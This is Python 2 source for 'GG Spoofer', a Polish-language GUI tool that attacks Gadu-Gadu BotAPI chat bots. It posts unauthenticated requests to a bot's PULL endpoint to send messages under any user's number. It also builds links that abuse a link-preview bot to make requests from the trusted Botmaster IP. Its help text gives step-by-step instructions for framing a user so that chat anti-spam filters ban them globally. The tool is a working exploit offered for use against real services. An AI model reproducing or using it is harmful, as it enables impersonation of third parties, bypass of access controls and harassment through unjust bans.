# -*- coding: utf-8 -*-
import requests
import Tkinter as tk
from urllib2 import urlopen
import tkMessageBox
from time import sleep
from pyperclip import copy
root = tk.Tk()
root.title("GG Spoofer")
root.resizable(False, False)
root.iconbitmap('./images/favicon.ico')
version = "1.1.3 BETA"
def status(gg_number):
	path = "http://status.gadu-gadu.pl/users/status.asp?id="+str(gg_number)+"&styl=6"
	status = urlopen(path).read()
	if(status == "unavailable"+chr(10)):
		status = "Niedostępny"
		filename = "niedostepny"
	if(status == "dnd"+chr(10)):
		status = "Nie przeszkadzać"
		filename = "nie_przeszkadzac"
	if(status == "busy"+chr(10)):
		status = "Zaraz wracam"
		filename = "zaraz_wracam"
	if(status == "talktome"+chr(10)):
		status = "Pogadam"
		filename = "pogadam"
	if(status == "available"+chr(10)):
		status = "Dostępny"
		filename = "dostepny"
	return status, filename
def help():
	tkMessageBox.showinfo("Pomoc", "Metoda HTTP_RAW_POST_DATA, czyli doklejanie HTTP_RAW_POST_DATA na końcu linku.\nPodobnie z RAW_POST_DATA.\n\nJeśli pierwsza metoda nie zadziała, spróbuj użyć drugiej. Jeśli druga nie zadziała, to już nie zadziała nic i będziesz mógł wysyłać jedynie puste wiadomości na dany numer.\n\nUWAGA! Z jakiegoś powodu czasami wiadomość z określonego numeru wysyłana jest dwukrotnie. Większość czatów jednak ma zabezpieczenie przed takim spamem.")
def ban():
	tkMessageBox.showinfo("Pomoc", "Jak zbanować kogoś globalnie na większości czatów? Sposób ten wykorzystuje kolejną lukę w botach na GG. Niestety nie zawsze działa.\n\nWymagania:\n1. Numer GG użytkownika, którego chcemy zbanować\n2. Numer GG czatu, na którym istnieje blokada antryeklamowa\n3. Komunikator z obsługą protokołu GG, np. Miranda IM\n4. Twój własny bot postawiony na platformie BotAPI (musisz go mieć w znajomych, a on ciebie)\n5. Oficjalny komunikator GG (http://gg.pl)\n\nInstrukcja:\n1. Zaloguj się do nieoficjalnego komunikatora swoim numerem GG i hasłem\n2. Utwórz nową konferencję z czatem oraz osobą, którą chcesz zbanować\n3. Napisz coś w konferencji, np. Hej\n4. Przejdź do oficjalnego komunikatora i zlokalizuj tę konferencję, otwórz ją\n5. Dodaj do niej twojego własnego bota, gotowe.\n\nWtedy na czacie z numeru osoby banowanej wyśle się wiadomość zawierająca numer dodanego bota. Filtr antyreklamowy wychwyci ten numer i uzna wiadomość jako próbę reklamy innego czatu, w związku z czym nasz użytkownik dostanie automatycznego bana globalnego.")
def about():
	tkMessageBox.showinfo("O programie", "Jak to działa?\n\nJeśli bot na GG nie jest zabezpieczony przed innymi adresami IP niż Botmaster (91.197.15.34), to można skorzystać z tej luki i wysyłać żądania POST na adres URL pliku PULL bota. Wiadomości PULL nie są autoryzowane przez BotAPI, dzięki czemu można oszukać bota i wysyłać wiadomości z dowolnego numeru GG.\nUWAGA! Spoofowany bot nie będzie mógł wysyłać odpowiedzi wiadomościami typu PUSH, jedynie PULL. Nie używaj też polskich znaków przy wysyłaniu wiadomości.\n\nMożna też spróbować ominąć blokadę przed innymi adresami IP niż Botmaster, generując specjalny link, który później można użyć w komunikatorze. Specjalny bot (GG PeekBot) wykonuje żądania GET do linków przesyłanych przez nowsze wersje GG, dzięki czemu możliwe jest wysyłanie określonych żądań z adresu IP Botmastera.\n\nKontakt z workonfire - GG:53338052")
welcome_label = tk.Label(root, text="GG Spoofer "+version, fg="blue").pack()
author = tk.Label(root, text="by workonfire").pack()
info_image = tk.PhotoImage(file="images/info.gif")
about_Button = tk.Button(root, text=" Więcej informacji", image=info_image, compound='left', command=about).pack(fill='x')
target_url_label = tk.Label(root, text="Adres URL do pliku PULL bota:").pack()
target_url_entry = tk.Entry(root)
target_url_entry.pack(fill='x')
from_label = tk.Label(root, text="Numer GG nadawcy (dowolny):").pack()
from_entry = tk.Entry(root)
from_entry.pack(fill='x')
to_label = tk.Label(root, text="Numer GG bota:").pack(fill='x')
to_entry = tk.Entry(root)
to_entry.pack(fill='x')
def generate():
	global target_url_entry
	global from_entry
	global to_entry
	method_value = option.get()
	message_to_send = botmaster_msg_entry.get()
	message_to_send = message_to_send.replace(' ', '%20')
	if(method_value == "HTTP_RAW_POST_DATA"):
		link = target_url_entry.get()+"?from="+from_entry.get()+"&to="+to_entry.get()+"&HTTP_RAW_POST_DATA="+message_to_send
	elif(method_value == "RAW_POST_DATA"):
		link = target_url_entry.get()+"?from="+from_entry.get()+"&to="+to_entry.get()+"&RAW_POST_DATA="+message_to_send
	else:
		tkMessageBox.showwarning("Ostrzeżenie", "Nie wybrano metody wysłania wiadomości.")
		return
	if(message_to_send == ''):
		tkMessageBox.showwarning("Ostrzeżenie", "Wprowadź wiadomość do wysłania.")
	else:
		result2 = tkMessageBox.askquestion("Wygenerowano link", "Oto wygenerowany link: "+link+"\n\nInstrukcja:\n1. Pobierz najnowszą wersję GG\n2. Zaloguj się na swoje konto i otwórz rozmowę z kimkolwiek (najlepiej z jakimś botem)\n3. Wklej do rozmowy powyższy link\n4. Wyślij\n\nJeżeli proces się nie uda, nic się nie stało. Ten sposób nie zawsze działa. Istnieją też boty z zabezpieczeniem przed tym.\n\nCzy chcesz skopiować powyższy link?")
		if(result2 == 'yes'):
			copy(link)
		else:
			return
def send(event=None):
	global listbox
	global msg_entry
	global target_url_entry
	global from_entry
	global to_entry
	msg = msg_entry.get()
	url = target_url_entry.get()
	params = {'from': int(from_entry.get()), 'to': int(to_entry.get())}
	listbox.config(state="normal")
	listbox.insert('end', "\nJa ("+from_entry.get()+") >> "+msg+"\n---------------------------------------------------------------------------")
	listbox.update()
	msg_entry.delete(0, 'end')
	r = requests.post(url = url, params = params, data = msg)
	listbox.insert('end', "\nBot ("+to_entry.get()+") >> "+r.text+"\n---------------------------------------------------------------------------")
	listbox.update()
	listbox.see("end")
	listbox.config(state="disabled")
def trigger():
	global msg_entry
	global listbox
	global to_entry
	global from_entry
	global target_url_entry
	if(target_url_entry.get() == '' or from_entry.get() == '' or to_entry.get() == ''):
		tkMessageBox.showwarning("Ostrzeżenie", "Wypełnij poprawnie wszystkie pola!")
	else:
		try:
			r2 = requests.head(target_url_entry.get())
			if(int(r2.status_code) != 200):
				tkMessageBox.showerror("Katastrofalny błąd", "Wystąpił problem z połączeniem z adresem "+target_url_entry.get()+".\nKod błędu HTTP: "+str(r2.status_code))
			elif(from_entry.get().isdigit() == False and from_entry.get() != ''):
				tkMessageBox.showwarning("Ostrzeżenie", "Podaj poprawny numer GG.")
			elif(to_entry.get().isdigit() == False and to_entry.get() != ''):
				tkMessageBox.showwarning("Ostrzeżenie", "Podaj poprawny numer GG.")
			elif(len(to_entry.get()) > 8):
				tkMessageBox.showwarning("Ostrzeżenie", "Poprawny numer GG posiada 8 cyfr lub mniej.")
			else:
				if(status(int(to_entry.get()))[0] == "Niedostępny"):
					result = tkMessageBox.askquestion("Jesteś pewien?", "Numer "+to_entry.get()+" ma status niedostępny. Może to oznaczać, że ten numer nie należy do bota, lecz do zwykłej osoby.\n\nCzy jesteś pewien, że powyższy numer GG jest numerem bota?", icon='question')
					if(result == 'no'):
						return
				if(target_url_entry.get()[-3:] != 'php'):
					result3 = tkMessageBox.askquestion("Jesteś pewien?", "Adres URL "+target_url_entry.get()+" może nie być bezpośrednim adresem do pliku PULL bota. Przykładowy poprawny adres: http://twojadomena.pl/bot/pull.php.\n\nCzy jesteś pewien, że powyższy adres jest prawidłowy?")
					if(result3 == 'no'):
						return
				chat_window = tk.Toplevel()
				chat_window.bind("<Return>", send)
				chat_window.resizable(False, False)
				chat_window.title("Rozmowa")
				chat_window.geometry('400x400')
				chat_window.iconbitmap('./images/favicon.ico')
				scrollbar = tk.Scrollbar(chat_window)
				scrollbar.pack(side='right', fill='y')
				frame = tk.Frame(chat_window)
				frame.pack()
				status_image = tk.PhotoImage(file="images/status/"+str(status(int(to_entry.get()))[1])+".gif")
				status_image_label = tk.Label(frame, image=status_image).pack(side="left")
				status_label = tk.Label(frame, text=status(int(to_entry.get()))[0]).pack(side="right")
				listbox = tk.Text(chat_window)
				listbox.pack(fill="both", expand=True)
				listbox.configure(font=("Verdana", 8))
				listbox.config(yscrollcommand=scrollbar.set)
				listbox.config(state="disabled")
				scrollbar.config(command=listbox.yview)
				msg_entry = tk.Entry(chat_window, width=38)
				msg_entry.pack(side="left", fill='x') # fill='x'
				send_button = tk.Button(chat_window, text="Wyślij", width=20, command=send)
				send_button.pack(side="right")
				chat_window.mainloop()
		except:
			tkMessageBox.showerror("Katastrofalny błąd", "Wystąpił problem z połączeniem z adresem "+target_url_entry.get()+".\nSprawdź poprawność adresu i spróbuj ponownie.")
def trigger2():
	global msg_entry
	global to_entry
	global from_entry
	global target_url_entry
	global botmaster_msg_entry
	global option
	if(target_url_entry.get() == '' or from_entry.get() == '' or to_entry.get() == ''):
		tkMessageBox.showwarning("Ostrzeżenie", "Wypełnij poprawnie wszystkie pola!")
	else:
		try:
			r2 = requests.head(target_url_entry.get())
			if(int(r2.status_code) != 200):
				tkMessageBox.showerror("Katastrofalny błąd", "Wystąpił problem z połączeniem z adresem "+target_url_entry.get()+".\nKod błędu HTTP: "+str(r2.status_code))
			elif(from_entry.get().isdigit() == False and from_entry.get() != ''):
				tkMessageBox.showwarning("Ostrzeżenie", "Podaj poprawny numer GG.")
			elif(to_entry.get().isdigit() == False and to_entry.get() != ''):
				tkMessageBox.showwarning("Ostrzeżenie", "Podaj poprawny numer GG.")
			elif(len(to_entry.get()) > 8):
				tkMessageBox.showwarning("Ostrzeżenie", "Poprawny numer GG posiada 8 cyfr lub mniej.")
			else:
				if(status(int(to_entry.get()))[0] == "Niedostępny"):
					result = tkMessageBox.askquestion("Jesteś pewien?", "Numer "+to_entry.get()+" ma status niedostępny. Może to oznaczać, że ten numer nie należy do bota, lecz do zwykłej osoby.\n\nCzy jesteś pewien, że powyższy numer GG jest numerem bota?", icon='question')
					if(result == 'no'):
						return
				if(target_url_entry.get()[-3:] != 'php'):
					result4 = tkMessageBox.askquestion("Jesteś pewien?", "Adres URL "+target_url_entry.get()+" może nie wskazywać na bezpośredni adres do pliku PULL bota. Przykładowy poprawny adres: http://twojadomena.pl/bot/pull.php\n\nCzy jesteś pewien, że powyższy adres jest prawidłowy?")
					if(result4 == 'no'):
						return
				botmaster_msg = tk.Toplevel()
				botmaster_msg.resizable(False, False)
				botmaster_msg.title("Wiadomość")
				botmaster_msg.iconbitmap('./images/favicon.ico')
				help_image = tk.PhotoImage(file="images/help.gif")
				help_Button = tk.Button(botmaster_msg, text=" Pomoc", image=help_image, compound='left', command=help).pack()
				botmaster_welcome_label = tk.Label(botmaster_msg, text="Wprowadź wiadomość do wysłania (bez polskich znaków):").pack()
				botmaster_msg_entry = tk.Entry(botmaster_msg)
				botmaster_msg_entry.pack(fill='x')
				msg_method_label = tk.Label(botmaster_msg, text="Metoda:").pack(anchor='w')
				option = tk.StringVar()
				option.set(1)
				R1 = tk.Radiobutton(botmaster_msg, text="HTTP_RAW_POST_DATA", value="HTTP_RAW_POST_DATA", var=option)
				R2 = tk.Radiobutton(botmaster_msg, text="RAW_POST_DATA", value="RAW_POST_DATA", var=option)
				R1.pack(anchor='w')
				R2.pack(anchor='w')
				generate_link_button = tk.Button(botmaster_msg, text="Wygeneruj link", command=generate)
				generate_link_button.pack(fill='x')
				botmaster_msg.mainloop()
		except:
			tkMessageBox.showerror("Katastrofalny błąd", "Wystąpił problem z połączeniem z adresem "+target_url_entry.get()+".\nSprawdź poprawność adresu i spróbuj ponownie.")
conv_image = tk.PhotoImage(file="images/conv_icon.gif")
button = tk.Button(root, text=" Rozpocznij konwersację", image=conv_image, compound='left', command=trigger)
button.pack(fill='x')
botmaster_label = tk.Label(root, text="Lub jeśli chcesz napisać do\nkogoś z adresu IP Botmastera:").pack()
link_image = tk.PhotoImage(file="images/mouse.gif")
botmaster_button = tk.Button(root, text=" Wygeneruj link", image=link_image, compound='left', command=trigger2)
botmaster_button.pack(fill='x')
ban_image = tk.PhotoImage(file="images/ban.gif")
ban_label = tk.Label(root, text="Lub jeśli chcesz zbanować kogoś\nna czacie bez uprawnień\n(uzupełnienie powyższych pól\nnie jest wymagane):").pack()
ban_Button = tk.Button(root, text=" Nałóż bana", image=ban_image, compound='left', command=ban).pack(fill='x')
root.mainloop()